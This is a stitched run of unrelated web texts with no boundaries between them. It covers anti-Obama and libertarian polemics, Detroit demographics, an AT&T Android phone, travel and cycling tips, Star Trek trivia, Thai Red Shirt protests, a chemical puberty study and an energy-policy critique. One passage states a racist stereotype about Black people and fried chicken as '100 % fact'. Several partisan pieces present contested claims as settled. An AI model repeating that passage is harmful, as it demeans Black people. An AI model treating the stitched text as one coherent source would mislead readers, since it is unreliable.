Slowly however , the quote is gaining traction and people are wondering exactly what he meant .
Are we to assume that he does n’t like our status as a military superpower ?
Would he seriously prefer that we downgrade our armed forces to the point where we defer our military responsibilities to other , more capable , countries ?
John McCain called the quote “ incredible , ” but his surprise at the statement is the only thing that ’s really shocking .
Since his inauguration , President Obama has repeatedly made decisions that can only lead one to the conclusion that he views American leadership with a sense of shame .
Our position as a global trailblazer is , “ whether we like it or not , ” going to be the first casualty in Obama ’s plan to “ rebuild America . ”
“ Whether we like it or not , ” when Obama took office , the U.S. was the world ’s leader in manned spaceflight .
A year later , he ’s outlined a plan that coverts our existing Constellation program into a rescue vehicle , cancels our return to the moon , and focuses more on automatons than men .
In a massive step backward , should we wish to reach the International Space Station ( two - thirds of which we pay for ) we ’ll be forced into the embarrassing position of buying passage aboard Russian Soyuz capsules .
The future of the U.S. astronaut is now nebulous at best , and platitudes presented in Obama ’s April 15th speech do nothing to change that fact .
Obama says he wants to see “ plans ” for a heavy lifting rocket by 2015 .
He wants to land on an asteroid , and he claims he ’ll live to see men orbit mars .
Yet for all of the lofty ideas , he offers no concrete goal , no deadlines , nor any real promise to fund anything beyond robots .
After 45 years , the nation which put a man on the moon has no concrete vision for the future of man in space .
Obama claims he is creating a “ transformative agenda ” for NASA but , much like his plan to rebuild America , he has offered no specifics .
In failing to do so , he is forfeiting our dominance in space and starting us on what astronauts Neil Armstrong , Jim Lovell , and Gene Cernan call “ A long downhill slide into mediocrity . ”
“ Whether we like it or not , ” before Obama came to power , we had the best health care on the planet .
That ’s not to say the system was without flaws , but there ’s a reason that world leaders flock to the U.S. for their medical needs .
Simply put , if you have a severe illness such as Cancer or Heart Disease , treatment in the United States is more likely to be successful than anywhere else on Earth .
Notice that Dems are no longer attempting to make the claim that Obama ’s new health care scheme will improve that care or reduce its cost .
It ’s now widely recognized that , under the President ’s plan , premiums will rise , quality will decline , and doctors will abandon the field .
Not wanting to be a part of the train wreck , members of government , including the President , have exempted themselves from it .
It ’s easy to see that , in a few short years , care will be rationed , and treatment survival rates will likely be lowered to match those found in the rest of the world .
Dems call the plan a “ good first step . ”
“ Whether we like it or not , ” we ’re also a financial superpower .
Do n’t worry , though , the president and Congressional Democrats have a plan to deal with that .
While unemployment hovers around 10 % , they are hailing the expiration of the Bush tax cuts , and Obama has enacted massive tax increases allegedly designed to pay for his health reforms .
They target those who own businesses , create jobs , and power the economy – they also fail to pay for his plan , which we now know is anything but deficit neutral .
In addition , Democrats are allowing the reinstatement of the death tax , and are maintaining the U.S. corporate tax rate as the second highest in the world .
47 % of Americans pay no taxes whatsoever , while 40 % of them receive some kind of government assistance .
Those who actually pay are being burdened with increasing federal income taxes , state taxes , sales taxes , usage taxes , and a rapidly growing thirteen trillion dollar deficit .
Now , Obama ’s minions are beginning to rally support for a National Sales ( VAT ) Tax , and a set of new , frighteningly powerful , executive powers aimed at “ regulating ” Wall Street .
It ’s impossible to believe that Democrats honestly think the current economic situation is sustainable , so the only logical conclusion is that they ’re purposely pursuing a plan that will cut the U.S. economy down to a globally respectful , non-shameful size .
In every one of these areas : the nuclear treaty , the gutting of NASA , health care reform , and economic policy , the public ’s disdain has been widespread and vocal .
According to both Rasmussen and Gallup , the number of Americans who feel America is headed in the right direction is now in the low thirties .
Obama ’s numbers languish in the mid forties , while congress polls in the low twenties .
Regardless , the President and his congressional allies have , time and again , passed legislation against the overwhelming opposition of their constituents .
Obama ’s ill - conceived policies damage his country while he travels the world bowing and apologizing .
The path he treads will undo this nation one piece at a time , “ whether we like it or not . ”
That picture is of a house in the city of Detroit .
Surprised ?
Do n’t be .
Detroit actually contains numerous intact neighborhoods ranging from working class to upscale .
These are seldom shown in the voluminous photo tours of the city that tend to focus exclusively on decay , and too often on the same handful of sites such as Michigan Central Station , a practice Vice Magazine dubbed “ ruin porn . ”
The decay is there .
The collapse is real .
That is the story .
But it ’s not the whole story .
Amid the truly legitimate and titanic struggles of Detroit there ’s another side , one that ’s too seldom told .
In the interest of completeness , I ’ll share some of it today .
Most of this material is not original to me .
It was created by two people I know only by their handles of “ hudkina ” and “ LMichigan ” .
I do n’t know who they are , though I get the vague impression they work for the state of Michigan .
They seems to spend most of their time engaged in quixotic message board debates about Detroit .
I ’d suggest they start blogging instead .
At any rate , credit to them for the ideas and picture links , though the data is mine .
Strange But True
Detroit is Big .
When you hear about Detroit , a mention of its population collapse can’t be far behind .
Detroit ’s population fell by 50 % from its peak and it was the first city to fall below one million in population after first exceeding it .
The region has fallen out of the top ten metro areas in size nationally .
But the other side is that Detroit is still big ( perhaps too big , but that ’s for another day ) .
The city of Detroit has 912,062 people , making even the city still the 11th largest in the United States .
Detroit has 100,000 more people than San Francisco and is 50 % bigger than Boston .
Detroit ’s metro area has 4.4 million people , making it the 11th largest in the United States .
That ’s about the same size as Boston or Phoenix .
But wait , there ’s more .
Nearby Ann Arbor is technically not part of the Detroit MSA , but probably soon will be .
That ’s another 350,000 people .
And Detroit does n’t include anything on the Canadian side of the river because it is in another country .
The Windsor , Ontario area adds another 300,000 + people .
Detroit is Dense .
You ’ve seen the pictures .
I ’ve even posted some .
The miles of empty streets and “ urban prairie ” .
A recent comprehensive survey recently discovered that fully one third of Detroit ’s lots are vacant .
But despite this , the overall density of the city is far higher than you might expect .
The city of Detroit has 6,571 people per square mile .
That ’s almost 60 % more dense than Portland , Oregon ( 4,152 ) !
Detroit ’s density is roughly comparable to Seattle ( 7,136 ) and Minneapolis ( 6,969 ) .
It ’s more dense ( sometimes much more dense ) than Denver , Cincinnati , Cleveland , Milwaukee , or St. Paul .
And if one third of Detroit is vacant , then localized densities must be much higher .
Detroit Has Money .
Detroit may be a very poor city , but with so many people in it , there are still a significant number of folks with money living inside the city limits .
There are 18,140 households in Detroit with income over $ 100,000 per year .
Milwaukee , hardly a basket case , has 19,297 .
Upscale Minneapolis only has 29,460 , a mere 10,000 household gap vs. Detroit in high earning households .
Now both of these cities are smaller ( Minneapolis much smaller ) and so are proportionately much richer .
But the point is that in total , there actually are a material number of households in the city of Detroit with significant incomes .
The Detroit metro area also has numerous upscale suburbs that hold their own with any around the country .
Detroit Has Immigrants .
Another thing that distinguishes Detroit versus other struggling cities is that it has been able to retain a significant foreign born population .
Detroit metro is 8.5 % foreign born , which does trail the US average of 12.8 % , but it is well above places like Cleveland ( 5.8 % ) or Cincinnati ( 3.6 % ) .
Detroit has also established itself as the hub of Arabs in America .
Muslims frequently get a bad rap , but unlike Muslim populations in Europe , which are often stuck in marginalized ghettos , the American Muslim population is more educated and makes more money than the population as a whole , according to some reports .
They range from Arab party store owners to Pakistani Ph.D.’s.
Detroit ’s Arab population is , like many immigrant groups , highly entrepreneurial .
While over 350,000 domestic migrants left the region , Detroit metro saw nearly 100,000 new international migrants move in during the 2000’s .
For these people at least , Detroit is still a land of opportunity .
Detroit Has Real Assets
Detroit also has some legitimate and impressive assets .
First is “ Brand Detroit . ”
In one of the famous Cleveland tourism videos , the song ends with “ at least we ’re not Detroit . ”
Actually , Cleveland might actually be better off if it were .
As with winning the NBA draft lottery , it ’s better to be worst than second worst .
Detroit has a powerful brand that literally resonates around the world .
I think it ’s fair to say that for people overseas with any familiarity with America , Detroit is one of the cities they know .
Most other places are ciphers .
Detroit is the main gateway to trade with Canada .
It also has a world - class airport that was just ranked as the most passenger friendly large airport in the United States by JD Power .
Originally a Northwest hub , it is actually benefiting from that carrier ’s merger with Delta .
Detroit is the second largest Delta hub and its primary gateway to Asia .
In an era where global connections are more important than ever , Detroit has or soon will have flights to London Heathrow , Tokyo , Seoul , and Hong Kong among other destinations .
Detroit also has a globally important legacy of innovation in popular music , ranging from Motown to electronica to hip - hop .
Artists like Eminem , Kid Rock , and the White Stripes still call Detroit home .
Also , it is home to the well - regarded Cranbrook school of art , as well as the College for Creative Studies .
If creativity really is key to the future economy , Detroit has it .

After years of being known as the carrier that has the iPhone , next week , AT&T will step out of its shell into the world of Android .
The number two carrier in the U.S. will launch the Motorola Backflip on March 7th .
The smartphone is set to cost $ 99 with a two year contract .
Initially , what set this phone apart was its interesting form factor and behind the screen trackpad .
However , Engadget 's Chris Ziegler points out something a little more strange about the Backflip in his hands on video ( see below ) .
" Yahoo has replaced Google as the default search provider throughout the phone .
It 's crazy : the home screen widget , the browser , everything 's been programmed to use Yahoo . "
Android is Google 's open source operating system .
Google search and services are tightly integrated into the OS by default .
They are the core of the phone 's functionality .
However , AT&T decided to go out of their way to strip the search feature and replace it with Yahoo .
Yahoo .
Not Bing , but Yahoo .
There seems to be no way to get a Google search widget on the phone .
It 's mind - boggling .
Perhaps AT&T has a vendetta against Google .
Either way , they 're really slapping Google in the face .
Taking advantage of a free OS which Google has opened up to the world , and then removing their search functionality from it is a ballsy move .
Some rumors even suggest that other AT&T Android phones may have Gmail , Maps , and all other Google services removed .
AT&T would then replace them with its own apps .
Rolling through a few countries or towns on a long trip can bring out the best in you .
You become more outgoing than usual , meet people from all around the world , and form tight bonds with fellow travelers .
You can also pick up a new language , try out new foods , and generally push your own boundaries .
It ’s all very exciting and energizing .
Still , sometimes you just need a little down time , something that can be in short supply when you ’re living out of a suitcase and sharing space in communal settings , like hostels .
Hostels offer some of the best places to meet other travelers , gather information , and make plans for future treks .
They are n’t the best places , however , for getting a little quiet time in .
Sure , you can rent a private room for a few bucks more and get a little solitude there — if you have the money in your budget for it .
Or you can rent a hotel room for a little more .
But what do you do if you ca n’t find or get space alone and you need a little quietude ?
Ear Plugs and iPods
Ear plugs are the bomb !
Pop them in and create a bubble of serenity around you , giving you the perfect space for a nap or the solitude you seek — right then and there .
They ’re portable .
They ’re cheap .
And they ’re available all over the place .
The trick is to find a spot , maybe in your bunk bed or in another room , and sack out .
Even just throwing in some ear plugs and shutting your eyes for a few moments can give you a bit of respite from the chaos of travel .
iPods do the same , letting you envelope yourself in a world of music wherever you are — as long as you are n’t flashing them around too much in less affluent areas , where pickpockets and other thieves lurk .
The Bathroom
An oasis of quiet at different times of the day , the bathroom can give you the alone time you need for a 20 minute break .
You can make your ablutions into a form of moving meditation , cleansing your mind of any turmoil , and making space for all the great new things coming your way .
Best done , of course , when running water is available and when there is n’t a line of people waiting for you to be done already .
The Woods
Another super space for finding some tranquility is the woods .
Any woods .
Wherever they are .
And they usually are nearby somewhere .
You just have to find them .
The ones on the edge of town or out of town are the best since they are less populated than parks in urban areas and often attract other people who want a moment of calm or at least a brief connection with nature .
Religious Structures
An absolutely perfect place to sit in silence is a church .
Or a cathedral .
Or a temple .
All of which are easily found and used in different locales around the world .
In Central America , most towns host a cathedral right in the center .
If you need to get away for a quick break , you can roll on into one of them and sit uninterrupted for however long you ’d like during the day .
You can do the same thing in Hindi temples in Bali , Buddhist temples in Korea and China , and even random churches across the U.S.
If you can find a yoga or meditation center where you are , even better .
So take a few moments to gather some silence around you .
And enjoy your travels all the more for it .

Nuts and bolts on your bike should always be tightened to the manufacturer 's specifications .
Most bikes these days come with ’ 21 speeds ’ .
However , this does n’t mean you have 21 useable gears .
Actually , on a 21 speed system it ’s closer to 13 .
A lot of people get confused by all of the gear combinations available .
I myself did n’t understand it when I first started using a multi-speed bike , so today we ’ll learn how to use your gears most effectively .
It ’s very important not to shift under pressure , as this will cause shift problems and damage your drivetrain .
If you ’re going uphill and you need a lower gear , keep pedaling , but ease off and pedal lightly while you shift .
Most systems have three gears on the front , which are controlled by your left shifter .
The rear gear cluster usually has 7 gears , with some systems having 8 or 9 .
Not to worry , the concepts here are the same .
For most everday riding , you ’ll want to keep your chain on the middle ring on the front , or number 2 on your left shifter .
This allows you to use the full range of rear gears .
Number 1 on your right shifter is the easiest gear for climbing hills , as it puts your chain on the largest rear sprocket .
Number 7 on your right shifter is the hardest gear for going really fast , and it puts your chain on the smallest rear sprocket .
I find it helps to think of numbers 1 and 3 on your left shifter as options for extreme circumstances .
If you ’re climbing a really tough hill and your left 2 and right 1 combination are n’t easy enough , you can shift your front derailleur to number 1 which drops the chain down to the smallest front chainring .
While you ’re in the smallest front gear you can shift the rear gears between 1 and 3 for a finer range adjustment , but you should always shift the front back to 2 , or the middle chainring before using gears 4 - 7 on the rear .
If you ’re going really fast and need a harder gear , and your left 2 and right 7 combination is n’t fast enough , you can shift your front derailleur to number 3 which pulls the chain up to the largest front chainring .
While you ’re in the largest front chainring you can shift the rear gears between 5 and 7 for a finer range adjustment , but always shift the front back to 2 , or the middle chainring before using gears 1 - 4 on the rear .
Never use the full range of rear gears when you ’re in either the small or large front sprockets ( number 1 or 3 on the front shifter ) .
This causes too great an angle in your chain line , which can cause noise and shifting problems .

For the year 47 , please see 1st century .
The number 47 makes frequent recurrences in dialogues and on computer screens in Star Trek .
The origin of the significance of 47 can be traced to Next Generation and Voyager writer Joe Menosky , who attended Pomona College in California .
There is a club at Pomona called The 47 Society , which claims that there exists a mathematical proof that all numbers are equal to 47 , and that the number 47 occurs with greater frequency in nature than other numbers – 74 makes frequent reappearances as well , as does 23 ( half of 47 rounded down ) .
Joe Menosky first started including references to 47 in his scripts in the fourth season of TNG , and the in - joke quickly caught on among the rest of the staff .
Since then , references to 47 have been included in many episodes and movies of all the modern series .
According to Ronald D. Moore , the number of 47 references in later seasons of Deep Space Nine declined as the production staff tired of the joke .
( AOL chat , 1997 )
When asked about the significance of the number , Rick Berman once joked , " 47 is 42 , corrected for inflation " referring to 42 being " the answer to the Ultimate Question of Life , the Universe , and Everything " according to The Hitchhiker 's Guide to the Galaxy by Douglas Adams .
The joke continued in J.J. Abrams ' Star Trek , as there are frequent 47s to be found in the alternate reality .
Abrams also used the number frequently in his previous TV series Alias .
In Star Trek Online , the MMORPG by Cryptic Studios , a major hub for Federation players to interact inside Earth Spacedock is on Deck 47 .
Off to the side of the promenade on Earth Spacedock , a player can dance at Club 47 .

Boehner Slams Obama ’s Offshore Drilling Expansion
Created : March 31 , 2010 10:49 | Last updated : July 31 , 2020 00:00
Last night , I predicted that President Obama would take some heat for his decision to expand oil drilling off much of the country ’s coastline .
But I did n’t think it would be coming from Republicans :
House Minority Leader John Boehner ( R - Ohio ) dismissed the president ’s plan as not going far enough in opening up U.S. waters for exploration .
Obama ’s decision “ continues to defy the will of the American people , ” Boehner said in a statement , pointing to the president ’s decision to open Atlantic and Gulf of Mexico waters , while leaving Pacific and many Alaskan waters largely closed to exploration .
This guy ai n’t easy to please .

Red Shirt barricade , Bangkok .
By Giles Ji Ungpakorn
April 29 , 2010 --
In a democratic society , when there is a deep crisis , it is customary for the government to dissolve parliament and call elections in order for the people to decide .
This happened in Britain and France after mass strikes and demonstrations in the 1960s and 1970s .
After mass right - wing Yellow Shirt protests against the government in Bangkok in 2006 , Thaksin Shinawatra ’s Thai Rak Thai government dissolved parliament and called elections .
Yet the Democrat Party and others refused to take part in these elections because they knew they would lose .
This led to a military coup .
The military wrote their own undemocratic constitution .
Fresh elections were held under the control of the military , yet Thaksin ’s party won an overall majority again .
Abhisit Vejjajiva ’s government is only in power by using two judiciary coups , Yellow Shirt violence at Government House and the airports , and the actions of the army .
It has never been elected .
So why is the government and its elite friends refusing to dissolve parliament and call immediate elections ?
They brush aside this simple Red Shirt demand .
Instead they bring armed soldiers and tanks on to the streets to break up an unarmed pro-democracy protest .
So far at least 27 people have died this year .
This is what the Thai crisis is all about .
It is about democracy vs dictatorship .
It is also about equality .
Let us look at the justification for refusing an election .
It is the same as the justification for the 2006 coup .
Basically the elites claim that the majority of ordinary people in Thailand are too poorly educated and too stupid to be allowed a free vote .
They claim that they are all “ bought ” by Thaksin .
It is the same old story throughout the history of democratic struggles in the world .
The poor are always insulted in this way .
Only the privileged classes and middle classes are deemed to be mature enough to vote .
The government and the military have now announced that the entire Red Shirt leadership is “ republican ” and therefore it is “ OK ” to shoot everyone .
Yes , I am a republican , but the Red Shirts ' leaders are unfortunately not .
Tell a huge lie about the Red Shirts so you can kill them “ with legitimacy ” .
This is what Abhisit means by “ democracy ” .
In Thailand it is now a capital offence to have political views which differ from the royalist elites .
This means that no one can tell if most
Thais love the king or not .
The chances are that millions of ordinary people now hate the monarchy because of what has been done in its name .
The tyrants can only react with violence , lies and censorship .
That is a sign of desperation .
Abhisit ’s military - backed government has rejected negotiations with the Red Shirts and rejected the olive branch offered to the government by the Red Shirts on April 23 .
After meeting with various foreign ambassadors at the protest site , Red Shirt leaders offered a compromise demand : dissolve parliament in one month and elections two months after that .
But Abhisit ’s military government has turned its back on a peaceful solution .
Abhisit and the army already have blood on their hands from the shooting of 21 civilians on April 10 .
The Red Shirts are strengthening their defences , calling in the Red Shirt motorcycle riders to defend the barricades , urging people to join the protests ( but not in red shirts so as not to be stopped by the military ) .
Mobile motorcycle troops carrying lethal weapons are driving around Bangkok intimidating people wearing red shirts on the streets .
Mobile motorcycle troops carrying lethal weapons are driving around Bangkok intimidating people wearing red shirts on the streets , while 30,000 troops are massing to use lethal force against civilian pro-democracy protesters in Bangkok .
Khon Kaen Red Shirts have stopped vanloads of police and taken their weapons .
Police seem to have cooperated .
Red motorcycle “ cavalry ” are setting up roadblocks on outer ring road around Bangkok to stop troops .
In Sakon Nakorn , north - east , Red Shirts have block a paramilitary border patrol police barracks .
Red Shirt motorcycle “ cavalry ” have surrounded troops with weapons at Rungsit mint , just north of Bangkok .
Thousands of Red Shirts in Udon , in the north - east , seized a police station and all the arms !
Fighting for democracy !
The king is silent and waiting , as ever , to see which side wins .
The queen and crown prince have shown support for the army .
Yet NGOs and “ peace ” groups continue to support the government stand and blame " both sides " for any violence .
NGOs therefore believe that the people do n't have a right to demand democracy and that the government has a right to mobilise troops against them .
So why are some people claiming that both sides in Thailand must “ avoid violence ” and “ take responsibility ” ?
Which side has the guns and tanks ?
Which side is refusing democratic elections ?
Would they have said this about the people 's power movement in the Philippines [ that overthrew dictator Marcos ] ?
Do they accuse Aung San Suu Kyi and the Buddhist monks of being equally responsible with the militiary regime for the violence in Burma ?
Were the students in Tiananmen Square “ responsible ” for their own deaths ?
Thailand will never be the same .
What will happen , no one knows .
But this is a revolutionary situation with a potential for freedom , democracy , social Justice ... or barbarism .

It is a commonly held truism that Black People ( and only Black People ) just love fried chicken , that they just ca n’t get enough of it .
That a Black Person would trade in all their worldly possessions for a lifetime supply of fried chicken .
This is without a doubt 100 % fact .
No other group of people on the entire planet likes fried chicken except Black People .
Both the Kentucky Fried Chicken and Popeye ’s Chicken franchises thrive only because of Black People ’s unquenchable lust for fried chicken .
If you ever see a Caucasian Person in a Popeye ’s Chicken or KFC it ’s because they are lost and are just asking for directions to the nearest Wendy’s .
But fried chicken is only the symptom to a much larger issue when it comes to Black Culture .
Black People love fried anything .
French Fries , fish , turkey , pork chops , you name it and it tastes better fried to any Black Person you feed it to .
If something can be cooked and eaten then it can be fried first .
If the only thing left to eat in the whole world were Twinkies , Black People would find a way to fry them and make them taste good .
But why do Black People like to fry things so much ?
No one really knows .
Not even slavery can explain this one away .
And despite the health risks associated with constantly eating fried foods , Black People have no intention of giving up this practice anytime soon .
Peace will come to the Middle East before Black People stop eating fried food , especially chicken .
Researchers at Mount Sinai School of Medicine have found that exposure to three common chemical classes -- phenols , phthalates and phytoestrogens -- in young girls may disrupt the timing of pubertal development , and put girls at risk for health complications later in life .
! ADVERTISEMENT !
The study , the first to examine the effects of these chemicals on pubertal development , is currently published online in the journal Environmental Health Perspectives .
" Research has shown that early pubertal development in girls can have adverse social and medical effects , including cancer and diabetes later in life , " said Dr. Mary Wolff , Professor of Preventive Medicine and Oncological Sciences at Mount Sinai School of Medicine .
" Our research shows a connection between chemicals that girls are exposed to on a daily basis and either delayed or early development .
While more research is needed , these data are an important first step in continuing to evaluate the impact of these common environmental agents in putting girls at risk . "
Phenols , phthalates and phytoestrogens are among chemicals known as endocrine disruptors , which interfere with the body 's endocrine , or hormone , system .
They are found in a wide range of consumer products , such as nail polishes , where they increase durability , and in cosmetics , perfumes , lotions , and shampoos , where they carry fragrance .
Some are used to increase the flexibility and durability of plastics such as PVC , or are included as coatings on medications or nutritional supplements to make them timed - release .
Dr. Wolff , co-principal investigator Susan Teitelbaum , PhD , Associate Professor , Preventive Medicine , and their team from Mount Sinai 's departments of Pediatrics and Microbiology recruited girls from the neighborhood of East Harlem , a unique minority population considered high risk .
Working with Cincinnati Children 's Hospital and Kaiser Permanente Northern California , they analyzed the impact of exposure to environmental agents in a study that included 1,151 girls from New York , greater Cincinnati and northern California .
The girls were between 6 - and 8 - years - old at enrollment and between 7 and 9 at analysis .
Researchers collected urine samples from the study participants and analyzed them for phenols , phthalates , and phytoestrogens , including 19 separate urine biomarkers .
The data showed that the three classes of chemical compounds were widely detectable in the study population , and that high exposure to certain chemicals was associated with early breast development .
The strongest links were seen with phthalates and phytoestrogens , which were also among the highest exposures .
One phenol , two phytoestrogens , and a subset of phthalates ( those found in building products and plastic tubing ) were associated with later puberty .
However , the phthalates found in personal products such as lotion and shampoo , especially those with fragrance , were related to earlier breast and pubic hair development .

Totalitarian Collectivism Are You a ' TC ' Proponent ?
Most have heard all they want to know about ' PC ' or political correctness .
But how many of you have come into contact with a much more hideous and sinister value system called ' TC ' ?
And even more important , are you an advocate of this behavior and its imposition on society ?
So just what is this conduct and who are the people who accept its tenants ?
Fiat money creators that enslave the public with their hatred for honest money ; are the designers of TC .
If you support the estate tax , progressive income tax , its graduated increase on greater income and redistribution of wealth ; YOU are a TC .
Advocates of direct elections for the Presidency ( as well as Senators ) , and the abolishment of the Electoral College ; YOU are a TC .
Proponents of the UN involvement 's that conflict with American interests and impose compliance upon nations that differ with the world community ; are TC .
Champions of criminalizing more non violent conduct , while applying lenient standards for the political and attorney class ; are the creators of TC .
Supporters of the Corporate economy , with its designed elimination of small business ; is a key element of TC .
Accountants that defend insane tax policies that force producers to adopt behavior and decisions that have no economic value , but will reduce tax obligations ; are implementers of TC .
Whiners that demand special treatment from government at the expense of the rest , are truly TC .
Shapers of public images and editors of news that tell only a favorable account of their masters and refuse to speak ill of corrupt political , business and public leaders ; are the messengers of TC .
Government bureaucrats that live for benefits and pensions , while the policies that they administer destroy the lives of honest citizens ; are the foot soldiers of TC .
Local elected officials that routinely accept unconstitutional laws from State and Federal departments and courts , and do nothing to challenge their fraud ; are subverters for TC goals .
Educators who impose an official line for acceptable thought and refuse to debate the merits of contrary views ; are the keepers of the TC keys .
Tree huggers that force unemployment upon families with their belief in senseless and unscientific theories ; are TC members .
Civil Rights advocates who 's notion of fairness justifies stealing from others to establish equality ; are the robbers for TC .
Private Property destroyers who rationalize piracy from others for the greater good of themselves or their ' so called ' society ; are TC thieves .
Feminists that promote killing as a ' RIGHT ' of woman and seek to cheapen all life as a means to express yourself ; are TC harlots .
But the most disgusting of all , are the hypocrites who know exactly what TC is , understand that it is indefensible and evil , and continue to advocate it 's use upon the sovereign individuals of America ; are the worst of all TC's .
So by now you may want to know just what TC stands for ?
Well TC is ' Totalitarian Collectivism ' .
It is much more dynamic than the guilt and peer pressure tactic of Political Correctness .
For force is the operative word in the T .
Imposition of penalties and sanctions are the means upon which individuals are compelled to accept the tenants of TC .
TC is based upon the power of the State to control people .
Their methods are designed to coerce acceptance and mold behavior .
The C is the object of the elite 's dream of complete dominion .
Collectivism encompasses all the ism's that seek to enslave man .
Communism , Socialism , Fascism , and the current ' Third Wave ' , are all part of the same scam that has been used to deceive mankind into willingly giving up their individual rights for the false promises , of a dishonest slave master .
The correctness in PC is the secular relativism that justifies accepting an erroneous assemblage of political doctrines .
While the collectivism in TC is the absolute aim and ultimate goal for the domination of humanity .
PC is bad enough , but TC will secure the shackle and chains of despair and suffering , on the vast hordes of humankind .
You are urged to start using this term in your writing and conversations and start explaining the threat that really is before us .
TC is real and the operative dictum of this age .
Our mutual duty is to resist it in any and every form it takes .
Our aspiration is to empower the greatest number of individuals to seek and realize the excellent and ability of their talents to achieve wealth , health , meaning and purpose for their life .
This goal cannot be realized within a TC culture .
The enemy of the human race are the proponents , protectors and defenders of TC .
Will you join the crusade against this infidel or are you content to accept the fate that is planned for you ?
This is one war that we are all involved , one that can not be escaped or one that can not be ignored .
The destiny of mankind rests upon your decision to resist .
SARTRE - March 10 , 2001
The principle that the majority have a right to rule the minority , practically resolves all government into a mere contest between two bodies of men , as to which of them shall be masters , and which of them slaves ; a contest , that -- however bloody -- can , in the nature of things , never be finally closed , so long as man refuses to be a slave .
Lysander Spooner Prologue to the " TC " Series BATR readers and loyal supporters :
The article , Are You a ' TC ' Proponent ? , was written in 2001 , before 911 .
Take a minute and reflect upon the inauspicious developments that have overtaken the United States since SARTRE coined the “ TC ” mantra .
New commentary postponed from 2006 until 2010 , returned in earnest .
The intervening years has been a personal horror story of combating the corporate juggernaut of industrial wind , the entrenched depravity of New York State energy and land use policy , and the total and complete corruption of local town government .
Now why should you care about the individual plight of paleo - conservative columnist ?
The honest answer is there is no expectation that you will .
However , what about confronting the harsh reality of corporate - government symbiotic linkage that ignores the natural rights of citizens in Western NY ?
How long before you and your own family will be the next victim and squarely in the sights for abuse ?
Do you care about your own condition or are you one of the post - modern era timid serfs , resigned to a fate of doom and servitude ?
The purpose of this BATR series , Totalitarian Collectivism , is to explore the options that endure for independent and ethically responsible individuals , co-existing within contrived governmental jurisdictions , and subject to the wrath of malevolent agents of tyrannical regimes .
The ersatz ecumenism of this age is the worship of a corporate state deity .
“ TC ” starts with a ten - part anthology .
A background review of the “ View from the Mount ” outline - Ten Points for Sensible Government – provides basic axioms of the role for righteous government .
The Header Banner has the State above and pulling the strings of the Church , Family , Economy , School and Media .
I will demonstrate that this familiar description of Totalitarian rule has additional components that effectively allows and maintains a top down power paradigm .
Collectivism is the Realpolitik of our society .
The People are methodically separated from their wealth , while an elite class of plutocrats systematically destroys the nation , as a prelude to total control .
Can this war against humanity be won ?
Is populism viable ?
Has human nature changed or are the results of that makeup evolving into a greater level of iniquity ?
Totalitarian Collectivism presents a historic context and offer up pragmatic answers in a world gone mad .

You do not defend a world that is already lost .
Garet Garrett
My general view of the talk is that Chu is extremely optimistic , in terms of what he thinks can be done .
He also fails to tell listeners what our real problems are .
Energy Secretary
Chu gave a talk at the EIA / SAIS Energy Conference on April 6 - 7 .
I want to share a few highlights of it , and give my impression .
Both the Powerpoint slides and audio can be accessed at this link .
Slide 2
Wow !
Slide 2 indicates that Chu thinks America has the opportunity to lead the world in a new industrial revolution .
How does he think that is going to be done ?
The first industrial revolution was during a time of increasingly available energy , because of the new use of coal .
That is very unlikely in the future , both because of peak oil , and because of hoped - for constraints on fossil fuel use because of climate change issues .
Net energy available to society is likely to be going down , not up !
It is hard to understand an industrial revolution under those circumstances , unless it is a retooling to a much lower level -- but later slides make it clear that is not what he is thinking of .
Slide 4
Yes , as Steven Chu says on Slide 4 , the Recovery Act does make a $ 80 billion down payment on a clean energy economy .
But it is nowhere near enough to do the whole job ( for example , to create a smart grid ) .
It is also temporary .
Once the funds run out , the whole investment must be made by others with funds .
Slide 10
Slide 10 shows energy densities -- it is one of the better slides that Energy Secretary Chu showed .
The top fuels from an energy density point of view are diesel and gasoline ( near the top , right side of the chart ) .
Kerosine , used in jet fuel is also near the top , as is human body fat .
The lithium ion battery , as currently produced , is down near the very bottom left corner ( worst ! ) in terms of energy density .
Chu indicated that there is work being done to perhaps produce a battery at the red star location .
If this can be done , the battery will have five times the current lithium ion battery 's energy density .
With this huge disparity between what batteries can do and what fuel can do , in terms of energy density , one gets the distinct impression that it is unlikely that electric vehicles will be ramped up any time soon .
So on the next slide we see :
Slide 11
Slide 11 talks about responsible expansion of offshore oil and gas exploration .
One could get the impression that there are huge amounts of oil and gas to be found in the offshore locations being opened up , but this is fairly unlikely .
An article by Gary Luquette , President , Chevron North America Exploration and Production Co. says :
The good news : the OCS [ Outer Continental Shelf ] has significant potential .
Over time , it could add 1 million more barrels of oil and natural gas equivalent a day -- potentially representing a fifth of the current total U.S. oil production .
Advances in technology could increase that amount dramatically .
One million of barrels a day of production would be good in many ways ( jobs , balance of payments , 20 % of U. S. production ) but it would n't save the world from peak oil .
In fact , it would amount to a little over 1 % world production -- and even if it can be ramped up a bit from 1 million barrels a day , it still is n't huge .
The amount available in the area recently announced off Virginia would likely be only a small fraction of this -- probably less than 100,000 barrels a day .
Slide 12
In Slide 12 , Secretary Chu seems to take credit for Department of Energy ( DOE ) research benefitting coal bed methane and shale gas production .
( Both of these are forms of natural gas . )
I can believe DOE 's research may have been helpful in coal bed methane production , since production started not long after funding ended in 1982 .
I am less convinced that it played a manor role in the development of shale gas , since there seems to be more of a lag in production after funding ended .
Perhaps a reader has more information on this .
Secretary Chu says that DOE is investing $ 64 million in early - stage research in for methane hydrates ( another potential source of natural gas ) .
The Oil Drum has published several posts on methane hydrates , most recently this one by Jean LaHerrere .
The deposits have been known for a long time , but all indications are that they are extremely difficult to extract , and pose a risk from a global warming point of view if the gas escapes during extraction .
I would expect that if natural gas from methane hydrates does get produced in quantity , it will be at least 15 years from now .
Since it would be natural gas , it still would not directly replace oil , which is what we need to run our vehicles , and is now in limited supply .
Slide 14
Slide 14 shows the learning curve in crystalline silicon and thin - film technology .
The problem is that total costs do n't go down nearly as quickly as the cost of high - tech pieces do .
When on looks at a Berkeley 2009 report on the Installed Cost of Photovoltaics , the graph of the total installed cost is much different .
Graphic from Installed Cost of Photovoltaics report , not Steven Chu presentation .
On a total installed cost basis , costs have been up in the $ 8.00 per Watt level , and not dropping quickly .
So the $ 1.00 Watt level shown in Chu 's slide does n't necessarily translate to low cost for the consumer .
Cost of other components and of installation on individual roofs is still expensive .
Slide 15
Carbon capture and storage ( CCS ) , mentioned in Slide 15 , has many issues .
One of them , according to Jeff Wright of the Federal Energy Commission at another talk at the same conference , is that it is likely to require increased use of fresh water -- something which is in increasingly short supply .
This by itself could be a deal - killer .
Another issue is the huge weight of carbon dioxide gas that will need to be transported long distances and reinjected .
